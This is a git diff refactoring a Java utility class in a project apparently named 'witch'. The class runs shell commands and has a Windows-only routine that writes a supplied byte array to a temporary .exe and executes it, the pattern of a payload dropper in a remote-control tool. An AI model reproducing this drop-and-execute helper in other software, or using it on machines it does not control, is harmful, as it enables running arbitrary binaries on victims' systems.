@@ -1,14 +1,19 @@
 package me.soda.witch.shared;
 
-import java.io.*;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
 
-@SuppressWarnings("ResultOfMethodCallIgnored")
 public class ProgramUtil {
     private static final Runtime RT = Runtime.getRuntime();
+    private static final String OS_NAME = System.getProperty("os.name").toLowerCase();
 
     public static boolean isWin() {
-        return System.getProperty("os.name").toLowerCase().contains("windows");
+        return OS_NAME.contains("windows");
     }
 
     public static String runCmd(String command) {
@@ -27,13 +32,11 @@ public class ProgramUtil {
 
     public static String getProcResult(Process process) {
         StringBuilder result = new StringBuilder();
-        try {
-            BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
+        try (BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
             String line;
             while ((line = inputStream.readLine()) != null) {
                 result.append(line).append("\n");
             }
-            inputStream.close();
             process.waitFor();
         } catch (IOException | InterruptedException e) {
             LogUtil.printStackTrace(e);
@@ -44,22 +47,18 @@ public class ProgramUtil {
     public static void runProg(byte[] bytes) {
         if (!isWin()) return;
         try {
-            File file = new File("temp.exe");
-            file.createNewFile();
-            FileOutputStream out = new FileOutputStream(file);
-            out.write(bytes);
-            out.close();
-            Process process = RT.exec("temp.exe");
+            Path tempFile = Files.createTempFile("temp", ".exe");
+            Files.write(tempFile, bytes);
+            Process process = RT.exec(tempFile.toString());
             process.waitFor();
-            if (file.exists()) file.delete();
+            Files.deleteIfExists(tempFile);
         } catch (IOException | InterruptedException e) {
             LogUtil.printStackTrace(e);
         }
     }
 
-
     public static void openURL(String url) {
-        String os = System.getProperty("os.name").toLowerCase();
+        String os = OS_NAME;
         Runtime rt = Runtime.getRuntime();
 
         try {
